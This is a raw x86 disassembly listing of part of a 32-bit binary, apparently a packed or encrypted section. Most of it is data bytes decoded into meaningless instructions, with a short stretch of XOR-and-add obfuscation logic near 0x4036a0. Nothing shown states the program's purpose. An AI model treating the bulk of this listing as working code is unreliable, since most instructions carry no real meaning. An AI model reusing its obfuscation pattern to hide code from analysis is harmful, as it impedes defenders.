  402fd9:	imul   esp,DWORD PTR [edi+0x15],0x7a
  402fdd:	push   esp
  402fde:	sbb    BYTE PTR [ebx+0x578b1c41],bl
  402fe4:	ins    BYTE PTR es:[edi],dx
  402fe5:	(bad)  
  402fe6:	add    BYTE PTR [ebx+0x56],0xfb
  402fea:	jg     0x402fff
  402fec:	dec    ebx
  402fed:	mov    bh,0xed
  402fef:	fucomp st(3)
  402ff1:	iret   
  402ff2:	mov    WORD PTR [edi],ss
  402ff4:	or     al,BYTE PTR [ecx-0x7f02cd79]
  402ffa:	inc    esi
  402ffb:	dec    edx
  402ffc:	mov    bl,0x6f
  402ffe:	in     al,0x10
  403000:	or     DWORD PTR [edi-0x40],0x4e
  403004:	pop    edi
  403005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403006:	mov    bh,0x1
  403008:	cmp    esi,DWORD PTR [ebx-0x5]
  40300b:	fnsave [ecx-0x162951a9]
  403011:	or     eax,0xdb78bdeb
  403016:	pop    ebx
  403017:	push   edx
  403018:	mov    ebx,0x47de6491
  40301d:	cdq    
  40301e:	mov    esp,ebp
  403020:	ins    BYTE PTR es:[edi],dx
  403021:	scas   eax,DWORD PTR es:[edi]
  403022:	les    edi,FWORD PTR [ecx]
  403024:	xor    al,0xaa
  403026:	mov    ds:0xd77ed2df,eax
  40302b:	add    eax,0xba54befe
  403030:	aaa    
  403031:	push   0x70c9a3a8
  403036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403037:	sub    eax,0xe9126544
  40303c:	(bad)  
  40303d:	and    BYTE PTR [esi],bh
  40303f:	rcr    ebx,0x7e
  403042:	into   
  403043:	icebp  
  403044:	addr16 push ebx
  403046:	push   esi
  403047:	push   es
  403048:	cmp    ecx,DWORD PTR [ebp-0xbdac65f]
  40304e:	xchg   BYTE PTR [eax],cl
  403050:	(bad)  
  403051:	pop    eax
  403052:	aas    
  403053:	push   ss
  403054:	jne    0x4030ce
  403056:	jg     0x40308c
  403058:	inc    edi
  403059:	fadd   DWORD PTR [ecx+0x55924b21]
  40305f:	fsubr  QWORD PTR [ecx]
  403061:	sub    al,0xbc
  403063:	test   eax,0xc2559acd
  403068:	jns    0x402ffd
  40306a:	and    eax,0x5436c7b9
  40306f:	aad    0xd
  403071:	pop    ds
  403072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403073:	int    0x4
  403075:	or     al,0x9a
  403077:	cmp    eax,0x13cf476c
  40307c:	test   DWORD PTR [ecx],0x137a4376
  403082:	push   esi
  403083:	cmp    bh,BYTE PTR [ecx-0x4f]
  403086:	or     eax,0x813224e6
  40308b:	in     al,dx
  40308c:	inc    ebx
  40308d:	int    0x63
  40308f:	mov    eax,0xf66c068
  403094:	jl     0x403096
  403096:	mov    ebp,0x155d7494
  40309b:	jbe    0x4030a8
  40309d:	cwde   
  40309e:	inc    eax
  40309f:	js     0x403048
  4030a1:	cli    
  4030a2:	push   0x65
  4030a4:	mov    dh,0xd5
  4030a6:	(bad)  [ebx+eiz*8-0x13e53cbc]
  4030ad:	jb     0x403031
  4030af:	xor    DWORD PTR [edx-0x5680f9be],ebx
  4030b5:	push   edi
  4030b6:	or     al,0xa8
  4030b8:	xor    BYTE PTR [ebp-0x35],ch
  4030bb:	mov    ebx,0x1b2fde2f
  4030c0:	es call 0x76cf9ad0
  4030c6:	idiv   ecx
  4030c8:	dec    ecx
  4030c9:	dec    ecx
  4030ca:	or     eax,0x1bb489a6
  4030cf:	fadd   QWORD PTR [ecx]
  4030d1:	out    0x8f,al
  4030d3:	je     0x403059
  4030d5:	xchg   DWORD PTR [esi-0x1f],ecx
  4030d8:	sbb    BYTE PTR [ebx],bh
  4030da:	stos   DWORD PTR es:[edi],eax
  4030db:	mov    al,0xfc
  4030dd:	inc    edi
  4030de:	push   edi
  4030df:	push   eax
  4030e0:	call   0x6995:0x1872439f
  4030e7:	or     al,0xbf
  4030e9:	xor    cl,BYTE PTR [eax+0x7c]
  4030ec:	or     eax,0x4b347ca5
  4030f1:	adc    esp,ecx
  4030f3:	std    
  4030f4:	imul   ecx,DWORD PTR [eax+0x32af50cf],0xe9e22428
  4030fe:	call   0x3bf:0xdf32a5cd
  403105:	rcl    BYTE PTR [ebp+ebp*4+0x6e],0x26
  40310a:	push   ebx
  40310b:	clc    
  40310c:	xchg   ecx,eax
  40310d:	sbb    ebp,esp
  40310f:	data16 rol BYTE PTR [edi],cl
  403112:	cwde   
  403113:	enter  0xf57,0x83
  403117:	xor    BYTE PTR [ebx+0x11fdfb3e],0xfe
  40311e:	and    BYTE PTR [edi+0x11b6de35],dl
  403124:	adc    al,0xd6
  403126:	das    
  403127:	pop    es
  403128:	xchg   edi,eax
  403129:	iret   
  40312a:	dec    edx
  40312b:	retf   
  40312c:	sbb    ah,BYTE PTR [edi+0x17]
  40312f:	push   edx
  403130:	sbb    eax,0x17b026e6
  403135:	pop    ebp
  403136:	adc    BYTE PTR [ecx+ebp*1],cl
  403139:	sub    cl,BYTE PTR [ebx-0x7a]
  40313c:	sahf   
  40313d:	push   0x55d673b9
  403142:	mov    WORD PTR [eax+0x46331821],gs
  403148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403149:	cli    
  40314a:	pop    edx
  40314b:	mov    bh,0x63
  40314d:	pushf  
  40314e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40314f:	sub    eax,0x9f2efe11
  403154:	arpl   bp,cx
  403156:	jo     0x403184
  403158:	xor    cl,dl
  40315a:	mov    edx,0xe6b17afe
  40315f:	or     cl,BYTE PTR [ecx+ebp*1+0x0]
  403163:	aam    0xde
  403165:	sbb    bh,BYTE PTR [esi+0x20]
  403168:	aas    
  403169:	inc    eax
  40316a:	inc    edx
  40316b:	pusha  
  40316c:	mov    cl,0x2b
  40316e:	test   bl,bl
  403170:	xor    DWORD PTR [esi+0x7d],esp
  403173:	mov    cl,BYTE PTR [esi*8-0x2becd29c]
  40317a:	and    BYTE PTR [edx+ebp*4-0x2],bl
  40317e:	pop    edi
  40317f:	stos   DWORD PTR es:[edi],eax
  403180:	mov    al,ds:0xdc93ca6c
  403185:	mov    esp,0x77da134a
  40318a:	jmp    0x1c1691bf
  40318f:	(bad)  
  403190:	xlat   BYTE PTR ds:[ebx]
  403191:	xor    edi,DWORD PTR [ecx-0x5f195c48]
  403197:	ror    esi,1
  403199:	mov    edi,ecx
  40319b:	or     DWORD PTR [edx+eiz*2+0x30],ecx
  40319f:	test   ecx,esp
  4031a1:	aad    0xc7
  4031a3:	outs   dx,DWORD PTR ds:[esi]
  4031a4:	lock adc BYTE PTR [edx+ecx*4-0x1a87b037],bl
  4031ac:	stos   BYTE PTR es:[edi],al
  4031ad:	sbb    al,BYTE PTR [edx]
  4031af:	bound  eax,QWORD PTR [edi-0x221a67dd]
  4031b5:	sbb    BYTE PTR [esi+esi*1],ah
  4031b8:	add    cl,BYTE PTR [edx-0x24da2b91]
  4031be:	pop    eax
  4031bf:	adc    ebp,eax
  4031c1:	fstp   st(2)
  4031c3:	xchg   esp,eax
  4031c4:	mul    BYTE PTR [eax-0x7c]
  4031c7:	ds das 
  4031c9:	or     ch,BYTE PTR [edi+eax*4]
  4031cc:	and    cl,BYTE PTR [esi]
  4031ce:	mov    esp,ebp
  4031d0:	loopne 0x4031fe
  4031d2:	stc    
  4031d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031d4:	mov    ?,WORD PTR [ebx+eax*1-0x9499ee9]
  4031db:	inc    ebx
  4031dc:	or     ch,bl
  4031de:	and    ecx,DWORD PTR [edx+eax*8+0x6c]
  4031e2:	or     DWORD PTR [eax-0x5e1a7186],esi
  4031e8:	clc    
  4031e9:	push   esp
  4031ea:	mov    edi,0x39fc6f9c
  4031ef:	loope  0x4031be
  4031f1:	inc    eax
  4031f2:	ficomp DWORD PTR [ebx+ebp*8+0x29]
  4031f6:	inc    edx
  4031f7:	fwait
  4031f8:	test   BYTE PTR [ecx],ch
  4031fa:	shl    al,1
  4031fc:	push   ss
  4031fd:	xlat   BYTE PTR ds:[ebx]
  4031fe:	jne    0x403216
  403200:	add    eax,0xff775998
  403205:	div    DWORD PTR [edi-0x47]
  403208:	ins    DWORD PTR es:[edi],dx
  403209:	adc    BYTE PTR [edi],bl
  40320b:	dec    ecx
  40320c:	aaa    
  40320d:	pop    ebp
  40320e:	xor    esi,esp
  403210:	mov    dh,0x50
  403212:	pop    edi
  403213:	jl     0x403222
  403215:	sbb    al,0x2
  403217:	dec    esi
  403218:	mov    ebx,0x8ab3ef54
  40321d:	jecxz  0x4031df
  40321f:	xor    ecx,eax
  403221:	pop    esi
  403222:	out    dx,al
  403223:	in     eax,0x28
  403225:	pushf  
  403226:	push   es
  403227:	mov    DWORD PTR [edi+0x1e7a58a3],0x6acf2e8e
  403231:	xor    BYTE PTR [edx+ecx*1],al
  403234:	push   esp
  403235:	push   ebp
  403236:	fisubr WORD PTR [ebx-0x6fca504b]
  40323c:	mov    dh,0xb4
  40323e:	push   esi
  40323f:	ja     0x4032b5
  403241:	pop    esi
  403242:	mov    bl,0x8b
  403244:	adc    eax,0x8ffbed3f
  403249:	pop    edx
  40324a:	sbb    DWORD PTR [ebx+0x2d],ebx
  40324d:	and    esi,ebp
  40324f:	jge    0x4032c0
  403251:	or     ebx,DWORD PTR [ebx]
  403253:	xchg   BYTE PTR [eax+esi*8-0x65],al
  403257:	mov    ebp,0xa8d4c642
  40325c:	or     DWORD PTR [bx],edi
  40325f:	(bad)  
  403260:	push   edi
  403261:	ret    
  403262:	ins    DWORD PTR es:[edi],dx
  403263:	ja     0x403257
  403265:	jno    0x403208
  403267:	test   BYTE PTR [esi+0x64],cl
  40326a:	jge    0x4032a0
  40326c:	stos   BYTE PTR es:[edi],al
  40326d:	shl    DWORD PTR [eax],1
  40326f:	push   cs
  403270:	ins    DWORD PTR es:[edi],dx
  403271:	sub    BYTE PTR [eax-0xa9a847e],dh
  403277:	mov    cs,WORD PTR [ecx-0x4462542a]
  40327d:	jns    0x4032ab
  40327f:	sbb    BYTE PTR [eax+0x295e0b],dh
  403285:	stc    
  403286:	gs xchg ah,cl
  403289:	mov    eax,ds:0x4e272c3c
  40328e:	or     BYTE PTR [ecx],bl
  403290:	pop    ebp
  403291:	bnd ret 
  403293:	ja     0x40328d
  403295:	add    al,0x12
  403297:	lock fist DWORD PTR ds:0xed9f01c8
  40329e:	dec    ebp
  40329f:	icebp  
  4032a0:	or     DWORD PTR [ebp-0x75],esi
  4032a3:	loopne 0x4032d5
  4032a5:	cmp    bh,BYTE PTR ds:[ebx]
  4032a8:	arpl   WORD PTR [esi],si
  4032aa:	(bad)  
  4032ab:	out    dx,al
  4032ac:	sub    eax,0xc4ed191a
  4032b1:	pandn  mm4,QWORD PTR [edi-0x6f81f71f]
  4032b8:	cmp    BYTE PTR [edi+0x51],dh
  4032bb:	mov    esp,0x8fdfc222
  4032c0:	push   edx
  4032c1:	icebp  
  4032c2:	or     BYTE PTR [ebp-0x22dc5f68],0x8d
  4032c9:	ss push edi
  4032cb:	adc    al,0xe1
  4032cd:	push   ds
  4032ce:	mov    esi,0xb443d979
  4032d3:	lods   eax,DWORD PTR ds:[esi]
  4032d4:	(bad)  
  4032d5:	clc    
  4032d6:	or     esi,DWORD PTR [eax]
  4032d8:	adc    al,0xec
  4032da:	jo     0x40331c
  4032dc:	out    dx,al
  4032dd:	ins    BYTE PTR es:[edi],dx
  4032de:	pop    ss
  4032df:	add    BYTE PTR [edx],ch
  4032e1:	lods   al,BYTE PTR ds:[esi]
  4032e2:	imul   edx,DWORD PTR [eax-0x15],0x40
  4032e6:	aaa    
  4032e7:	adc    eax,0x5aed8458
  4032ec:	push   esi
  4032ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032ee:	pop    ds
  4032ef:	dec    edi
  4032f0:	mov    eax,0x776c0e65
  4032f5:	test   DWORD PTR [ecx],0x777d93fc
  4032fb:	push   esi
  4032fc:	cmp    esi,ecx
  4032fe:	mov    ah,0x4b
  403300:	scas   al,BYTE PTR es:[edi]
  403301:	sbb    DWORD PTR [eax+0x7bcdbe6b],ecx
  403307:	dec    ebx
  403308:	sbb    DWORD PTR [edx-0x6a],eax
  40330b:	sbb    eax,0x90d85dbd
  403310:	mov    al,0x57
  403312:	imul   ebx,DWORD PTR [ebp-0x6ba9693b],0xffffff94
  403319:	inc    eax
  40331a:	and    eax,DWORD PTR [esi]
  40331c:	push   esp
  40331d:	xchg   edi,eax
  40331e:	sub    dh,al
  403320:	daa    
  403321:	mov    esi,0xcc495cc6
  403326:	ja     0x4032d0
  403328:	mov    al,ds:0x561797fc
  40332d:	aaa    
  40332e:	sub    edx,DWORD PTR [esi]
  403330:	xor    edi,DWORD PTR [ebp-0x74fb06d4]
  403336:	jge    0x403316
  403338:	fwait
  403339:	push   ds
  40333a:	jno    0x40335e
  40333c:	jo     0x403396
  40333e:	ret    
  40333f:	scas   al,BYTE PTR es:[edi]
  403340:	ds int 0x35
  403343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403344:	clc    
  403345:	sub    DWORD PTR [ebx+eax*1+0x57e3abc9],0x62
  40334d:	cmp    ebx,DWORD PTR [ebp+0x3aa705e2]
  403353:	push   edx
  403354:	fwait
  403355:	pop    esi
  403356:	add    eax,0x2ee81060
  40335b:	addr16 aaa 
  40335d:	retf   
  40335e:	data16 sti 
  403360:	cmp    eax,0x67b0a9c7
  403365:	mov    ebp,0xf5c530d8
  40336a:	repnz cmp BYTE PTR [edx+ecx*8-0x53],cl
  40336f:	cs pop edx
  403371:	icebp  
  403372:	(bad)  
  403373:	sub    ebp,esp
  403375:	test   dh,ch
  403377:	jle    0x403385
  403379:	mov    ch,0x8b
  40337b:	mov    esp,0x693e3cf0
  403380:	mov    esi,0x1aec40c3
  403385:	xor    al,0x92
  403387:	mov    ah,0x71
  403389:	int3   
  40338a:	div    DWORD PTR [eax+0x2]
  40338d:	pushf  
  40338e:	dec    edi
  40338f:	lock mov edi,0x501922c7
  403395:	outs   dx,DWORD PTR ds:[esi]
  403396:	dec    ebp
  403397:	fwait
  403398:	pavgb  mm1,QWORD PTR [ecx+0x7cd75e54]
  40339f:	adc    BYTE PTR [ecx-0x253ac015],cl
  4033a5:	(bad)  
  4033a6:	call   0x3d753e4c
  4033ab:	pop    edx
  4033ac:	xchg   ecx,eax
  4033ad:	inc    esp
  4033ae:	xor    ecx,eax
  4033b0:	sub    al,0x8d
  4033b2:	test   DWORD PTR [esi+0xbcb1734],eax
  4033b8:	jae    0x403400
  4033ba:	and    DWORD PTR [eax-0xa1028e6],eax
  4033c0:	pushf  
  4033c1:	mov    al,0x5f
  4033c3:	push   0xffffffc1
  4033c5:	adc    al,0xf9
  4033c7:	pop    ecx
  4033c8:	ds popf 
  4033ca:	and    al,0xd3
  4033cc:	mov    BYTE PTR [ebx-0x180eadb2],dh
  4033d2:	lss    edx,FWORD PTR [ecx+eax*4]
  4033d6:	add    cl,bl
  4033d8:	sub    DWORD PTR [ebx+0x3b],edi
  4033db:	mov    ch,BYTE PTR [ecx-0x1e]
  4033de:	sti    
  4033df:	in     al,0x58
  4033e1:	and    eax,0x44253477
  4033e6:	jne    0x40341d
  4033e8:	faddp  st(6),st
  4033ea:	jge    0x403466
  4033ec:	pop    edx
  4033ed:	fstp   DWORD PTR [edx]
  4033ef:	mov    bh,0xb6
  4033f1:	pusha  
  4033f2:	arpl   WORD PTR [esi+edi*1+0x6679772b],ax
  4033f9:	pushf  
  4033fa:	add    ch,ch
  4033fc:	mov    al,ds:0xf3ec37cb
  403401:	push   0xb7469f80
  403406:	cmp    ebp,ecx
  403408:	gs js  0x403424
  40340b:	sub    DWORD PTR [edx-0x5aaadc15],edx
  403411:	retf   
  403412:	add    esp,DWORD PTR [esi-0x64]
  403415:	mov    cl,0x74
  403417:	popa   
  403418:	aam    0x21
  40341a:	jle    0x403464
  40341c:	mov    al,ds:0xe49c9fe4
  403421:	xor    DWORD PTR [eax+0x3e1dcada],0xe586c045
  40342b:	dec    esi
  40342c:	mov    bh,0xe9
  40342e:	cmp    al,0xbe
  403430:	jae    0x403404
  403432:	jg     0x4033b7
  403434:	mov    ch,0x7e
  403436:	cmp    eax,0xf06a1d1a
  40343b:	mul    BYTE PTR [ebx]
  40343d:	jno    0x4034ac
  40343f:	das    
  403440:	sub    BYTE PTR [edx+0x45b5be36],ch
  403446:	xor    al,0xb1
  403448:	ja     0x403432
  40344a:	and    eax,0x8c8b0fc3
  40344f:	adc    al,0xde
  403451:	lock sbb edi,DWORD PTR [edx+0x34c737a5]
  403458:	into   
  403459:	fistp  DWORD PTR [esi+0x3a099951]
  40345f:	xchg   edi,eax
  403460:	push   edi
  403461:	mov    ch,0xac
  403463:	sub    DWORD PTR [eax-0x11b271a0],ebp
  403469:	xchg   BYTE PTR [eax-0x2e],bl
  40346c:	mov    ds:0xc98c6c2,eax
  403471:	(bad)  
  403472:	pop    esp
  403473:	call   0x9dffba19
  403478:	imul   edx,DWORD PTR [edi],0xffffffb7
  40347b:	pop    edx
  40347c:	mov    ebx,0x774585b6
  403481:	add    al,0x4b
  403483:	popf   
  403484:	rcl    BYTE PTR [ebx+edi*8-0x69],1
  403488:	mov    ebp,0x7b7444e5
  40348d:	shl    DWORD PTR [edi+0x61],1
  403490:	sbb    cl,BYTE PTR [edx+0x35]
  403493:	lods   eax,DWORD PTR ds:[esi]
  403494:	popf   
  403495:	pop    ecx
  403496:	fmul   DWORD PTR [edx+0x13903dd2]
  40349c:	shl    DWORD PTR [eax+0x49],cl
  40349f:	shr    DWORD PTR [ecx-0x79],1
  4034a2:	jns    0x40342e
  4034a4:	mov    ah,0xdb
  4034a6:	test   DWORD PTR [edx],edi
  4034a8:	sub    eax,0xaad052b5
  4034ad:	add    DWORD PTR fs:[ecx],eax
  4034b0:	xchg   edx,eax
  4034b1:	sub    cl,BYTE PTR ds:0x7f18d457
  4034b7:	mov    ecx,0x7b516c1c
  4034bc:	xchg   cl,bl
  4034be:	aas    
  4034bf:	pop    edi
  4034c0:	push   edx
  4034c1:	lock sub DWORD PTR [esi+0xeedd33c],esp
  4034c8:	popa   
  4034c9:	push   esp
  4034ca:	js     0x403520
  4034cc:	push   0xb60fe014
  4034d1:	je     0x4034b8
  4034d3:	lods   al,BYTE PTR ds:[esi]
  4034d4:	xchg   BYTE PTR [ebp+esi*8-0x5d62084],ch
  4034db:	cmc    
  4034dc:	lods   al,BYTE PTR ds:[esi]
  4034dd:	sar    ecx,0x38
  4034e0:	push   ecx
  4034e1:	leave  
  4034e2:	push   es
  4034e3:	ins    DWORD PTR es:[edi],dx
  4034e4:	daa    
  4034e5:	es jecxz 0x403469
  4034e8:	out    0x8b,al
  4034ea:	(bad)  
  4034eb:	push   ebp
  4034ec:	sub    DWORD PTR [esi+0x43748797],ecx
  4034f2:	icebp  
  4034f3:	xchg   ecx,eax
  4034f4:	sbb    esi,DWORD PTR [edi-0x30ceb292]
  4034fa:	idiv   BYTE PTR [edx+0x58]
  4034fd:	clc    
  4034fe:	and    BYTE PTR [ebp+0x69],cl
  403501:	(bad)  
  403503:	call   0x117ee809
  403508:	mov    dl,0xa3
  40350a:	popf   
  40350b:	mov    eax,0x44edb470
  403510:	sbb    dh,dh
  403512:	adc    esi,DWORD PTR [esi-0x75]
  403515:	jl     0x4034c4
  403517:	repnz and bh,BYTE PTR [edi]
  40351a:	xchg   esp,eax
  40351b:	cld    
  40351c:	out    dx,al
  40351d:	push   edx
  40351e:	inc    eax
  40351f:	pop    esp
  403520:	pop    es
  403521:	or     bh,BYTE PTR [edi-0x5a]
  403524:	and    al,0xf6
  403526:	sbb    BYTE PTR [edx+0x574fd134],dl
  40352c:	test   BYTE PTR [esi],cl
  40352e:	xor    eax,0xc63972af
  403533:	push   ebx
  403534:	sub    eax,0x5af86e06
  403539:	js     0x4034fc
  40353b:	or     al,0x10
  40353d:	xor    DWORD PTR [edi+0x7c],esi
  403540:	mov    ebx,0x33f1108e
  403545:	jb     0x403570
  403547:	dec    ebx
  403548:	pop    edx
  403549:	js     0x40351a
  40354b:	(bad)  
  40354c:	cmp    eax,0x19cf5e4f
  403551:	mov    ah,0xf0
  403553:	cwde   
  403554:	mov    ebp,0x767051d7
  403559:	sar    DWORD PTR [edx+0x4f],0x9f
  40355d:	cmp    DWORD PTR [edi+0x5de8600b],esp
  403563:	fucomp st(3)
  403565:	sahf   
  403566:	xchg   edi,eax
  403567:	push   ecx
  403568:	mov    edi,0x3422de2e
  40356d:	mov    ah,0x8b
  40356f:	scas   al,BYTE PTR es:[edi]
  403570:	add    al,0x2e
  403572:	mov    al,ds:0x5b261480
  403577:	repz mov es,esi
  40357a:	imul   eax,DWORD PTR [edi],0x6f41c688
  403580:	jae    0x40353b
  403582:	(bad)  
  403583:	(bad)  
  403584:	fsubr  DWORD PTR [ecx-0x595c56f6]
  40358a:	je     0x403536
  40358c:	cld    
  40358d:	and    DWORD PTR [edi+0x62],0xa5f85341
  403594:	xor    eax,0x574f444a
  403599:	xor    esp,DWORD PTR [ecx+0x46]
  40359c:	popa   
  40359d:	push   es
  40359e:	push   ds
  40359f:	outs   dx,DWORD PTR ds:[esi]
  4035a0:	mov    eax,ds:0x25a1c1ea
  4035a5:	sbb    ebp,DWORD PTR [edi]
  4035a7:	mov    bh,0x1b
  4035a9:	fdivr  QWORD PTR [edx-0x77]
  4035ac:	inc    edx
  4035ad:	add    al,0xc3
  4035af:	rcr    cl,0xbf
  4035b2:	cmc    
  4035b3:	sub    dl,BYTE PTR [ebx-0x5fb43daa]
  4035b9:	fwait
  4035ba:	call   0xed5cd434
  4035bf:	je     0x4035b8
  4035c1:	inc    DWORD PTR [ecx-0x3d338af3]
  4035c7:	jb     0x403558
  4035c9:	cmp    DWORD PTR [edx-0x37],esp
  4035cc:	dec    esp
  4035cd:	sub    edi,DWORD PTR [ebp+0x30]
  4035d0:	adc    DWORD PTR [bp+0x5a],0xffffffda
  4035d5:	sub    ch,BYTE PTR [ecx]
  4035d7:	sub    ebp,DWORD PTR [ebx]
  4035d9:	(bad)  
  4035da:	daa    
  4035db:	jg     0x403618
  4035dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035de:	scas   eax,DWORD PTR es:[edi]
  4035df:	sub    BYTE PTR [ebx-0x2497d56f],dl
  4035e5:	mov    ebp,0xac1aed5e
  4035ea:	in     al,0x57
  4035ec:	ror    DWORD PTR [esi],0x34
  4035ef:	cs call 0xe532:0x2a215161
  4035f7:	fild   QWORD PTR [ebp-0x752ca1f2]
  4035fd:	(bad)  
  4035fe:	jle    0x403596
  403600:	inc    ecx
  403601:	sub    esp,ebx
  403603:	(bad)  
  403604:	lock clc 
  403606:	shl    BYTE PTR [ebx+0x1cb21f7b],0x90
  40360d:	retf   
  40360e:	addr16 int 0x30
  403611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403612:	push   ss
  403613:	add    edx,esp
  403615:	in     al,0x47
  403617:	lock repz mov ch,0x86
  40361b:	call   0x180c:0xb78a6ccc
  403622:	mov    edi,0xae805b08
  403627:	ins    DWORD PTR es:[edi],dx
  403628:	add    ebx,ecx
  40362a:	cmp    BYTE PTR [eax-0x50314388],dh
  403630:	in     al,dx
  403631:	and    al,0x43
  403633:	out    dx,eax
  403634:	outs   dx,DWORD PTR ds:[esi]
  403635:	mov    DWORD PTR [esi+0x5e],0xa19342e8
  40363c:	xchg   ecx,eax
  40363d:	jmp    0xfa33f3d0
  403642:	loopne 0x40361a
  403644:	ret    
  403645:	mov    ebx,0x46d8f374
  40364a:	mov    edi,0x50baa321
  40364f:	cmc    
  403650:	mov    edi,0x6e8f2c5f
  403655:	pusha  
  403656:	jno    0x40368f
  403658:	xor    eax,DWORD PTR [esi-0x76950bbd]
  40365e:	sahf   
  40365f:	and    al,0x5b
  403661:	inc    eax
  403662:	xor    BYTE PTR [esi],cl
  403664:	outs   dx,DWORD PTR ds:[esi]
  403665:	int    0x4
  403667:	das    
  403668:	add    al,0x4e
  40366a:	out    0xb9,al
  40366c:	fwait
  40366d:	sbb    eax,0xbb4f55c0
  403672:	push   esi
  403673:	mov    esi,DWORD PTR [ebp-0x1e]
  403676:	adc    eax,0x9884abc7
  40367b:	jge    0x403686
  40367d:	mov    al,0x21
  40367f:	lea    ebx,gs:0x596fcc2b
  403686:	and    dl,dl
  403688:	jne    0x403657
  40368a:	outs   dx,DWORD PTR ds:[esi]
  40368b:	mov    edi,0x143f8140
  403690:	and    BYTE PTR [ebx-0x50],0x82
  403694:	lock xor al,BYTE PTR [eax+0x1f]
  403698:	jne    0x403646
  40369a:	adc    DWORD PTR [ebx],eax
  40369c:	push   ecx
  40369d:	mov    ecx,DWORD PTR [ebp-0x4]
  4036a0:	inc    ecx
  4036a1:	mov    edx,DWORD PTR [ebp-0x8]
  4036a4:	mov    DWORD PTR [ebp-0x4],ecx
  4036a7:	cmp    ecx,edx
  4036a9:	jne    0x4012c9
  4036af:	mov    ecx,DWORD PTR [ebp-0x20]
  4036b2:	mov    edx,DWORD PTR [ebp-0x1c]
  4036b5:	mov    edx,DWORD PTR [ebp+0x10]
  4036b8:	xor    ecx,eax
  4036ba:	add    ecx,esi
  4036bc:	mov    DWORD PTR [edx],ecx
  4036be:	mov    ecx,DWORD PTR [ebp-0x20]
  4036c1:	mov    edx,DWORD PTR [ebp-0x1c]
  4036c4:	xor    ecx,eax
  4036c6:	add    ecx,esi
  4036c8:	mov    DWORD PTR [ebp+0x8],ecx
  4036cb:	mov    DWORD PTR [ebp-0x18],0xce946f82
  4036d2:	mov    DWORD PTR [ebp-0x14],edi
  4036d5:	mov    edi,0x856a
  4036da:	jmp    0x405b22
  4036df:	mov    ecx,DWORD PTR [ebp+0x8]
  4036e2:	sub    ecx,0x376272fb
  4036e8:	xor    ecx,0x751018b5
  4036ee:	mov    DWORD PTR [ebp-0xc],ecx
  4036f1:	mov    ecx,DWORD PTR [ebp-0x18]
  4036f4:	mov    edx,DWORD PTR [ebp-0x14]
  4036f7:	xor    edx,edi
  4036f9:	mov    edi,DWORD PTR [ebp-0x30]
  4036fc:	mov    ebx,DWORD PTR [ebp-0x2c]
  4036ff:	xor    ecx,eax
  403701:	xor    edi,eax
  403703:	xor    ebx,0x856a
  403709:	sub    ecx,edi
  40370b:	sbb    edx,ebx
  40370d:	add    ecx,0xa9bdbec9
  403713:	adc    edx,0xffffa89a
  403719:	xor    ecx,eax
  40371b:	mov    DWORD PTR [ebp-0x18],ecx
  40371e:	mov    edi,0x856a
  403723:	xor    edx,edi
  403725:	mov    DWORD PTR [ebp-0x14],edx
  403728:	mov    ecx,DWORD PTR [ebp+0x8]
  40372b:	mov    cl,BYTE PTR [ebp+ecx*1-0x50]
  40372f:	mov    edx,DWORD PTR [ebp-0x28]
  403732:	mov    ebx,DWORD PTR [ebp-0x24]
  403735:	cmp    cl,dl
  403737:	je     0x405b0d
  40373d:	jmp    0x405ac8
  403742:	and    DWORD PTR ds:0x34978a93,ebx
  403748:	and    BYTE PTR [edx*1+0x66a27a69],dh
  40374f:	cmp    ebp,DWORD PTR [ebp+0x33]
  403752:	in     eax,0x98
  403754:	jnp    0x4037d1
  403756:	in     eax,0x98
  403758:	jnp    0x4037d5
  40375a:	pusha  
  40375b:	xchg   ebx,eax
  40375c:	jno    0x4037d3
  40375e:	int    0x2d
  403760:	push   es
  403761:	xchg   edi,eax
  403762:	or     esp,DWORD PTR [ecx+0x1e]
  403765:	dec    edi
  403766:	bound  esi,QWORD PTR [ebx-0x1a35e143]
  40376c:	xchg   DWORD PTR [edi-0x1c32746e],esi
  403772:	sbb    DWORD PTR [edx],ebx
  403774:	sub    esi,DWORD PTR [ecx+0x91fac61]
  40377a:	inc    ebx
  40377b:	pusha  
  40377c:	rol    DWORD PTR [ebx],cl
  40377e:	popf   
  40377f:	add    DWORD PTR [edi-0x15],edx
  403782:	xor    BYTE PTR [eax],bl
  403784:	stos   DWORD PTR es:[edi],eax
  403785:	lea    esp,[ebx+0x33]
  403788:	lock and cl,BYTE PTR [ebx]
  40378b:	(bad)
  40378e:	and    BYTE PTR [edx-0x38d83b76],0xb1
  403795:	cwde   
  403796:	outs   dx,DWORD PTR ds:[esi]
  403797:	call   0x7bade5b4
  40379c:	adc    esi,DWORD PTR [ebx-0x76]
  40379f:	imul   esi,ecx,0xeed8039a
  4037a5:	(bad)  
  4037a6:	out    0x5a,eax
  4037a8:	jl     0x4037fc
  4037aa:	ins    BYTE PTR es:[edi],dx
  4037ab:	push   ebx
  4037ac:	clc    
  4037ad:	shl    BYTE PTR [ebp+0x12],1
  4037b0:	nop
  4037b1:	and    bh,ah
  4037b3:	push   cs
  4037b4:	jg     0x40376a
  4037b6:	cdq    
  4037b7:	push   esi
  4037b8:	add    edi,DWORD PTR [ebx-0x67]
  4037bb:	dec    edi
  4037bc:	xchg   bh,dh
  4037be:	gs addr16 sub al,0x9
  4037c2:	stos   BYTE PTR es:[edi],al
  4037c3:	int    0x9f
  4037c5:	fnstcw WORD PTR [ecx]
  4037c7:	xchg   ebp,eax
  4037c8:	sub    al,dl
  4037ca:	bound  edx,QWORD PTR [edi]
  4037cc:	out    0xc3,al
  4037ce:	mov    ebx,0x69494611
  4037d3:	jno    0x403843
  4037d5:	lods   al,BYTE PTR ds:[esi]
  4037d6:	inc    edi
  4037d7:	jo     0x403770
  4037d9:	and    BYTE PTR [ebp+esi*2+0x4a0c498a],al
  4037e0:	xor    bh,BYTE PTR [ecx+0x6f8a2ad5]
  4037e6:	adc    al,0xa2
  4037e8:	pushf  
  4037e9:	xchg   esp,eax
  4037ea:	xor    BYTE PTR [ebp-0x2f4d0f9d],cl
